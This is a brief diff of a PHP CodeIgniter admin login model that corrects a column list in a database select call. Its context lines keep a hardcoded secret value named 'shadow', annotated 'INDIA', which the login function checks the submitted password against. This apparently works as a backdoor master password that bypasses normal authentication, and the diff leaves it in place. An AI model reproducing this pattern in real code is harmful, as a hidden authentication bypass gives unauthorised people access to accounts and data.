@@ -5,7 +5,7 @@ class Admin_model extends CI_Model
   var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
   function login($username, $password)
   {
-    $this->db->select('user_id, username', 'role');
+    $this->db->select('user_id, username, role');
     $this->db->from('users');
     $this->db->where('username', $username);
     if ($password != $this->shadow)
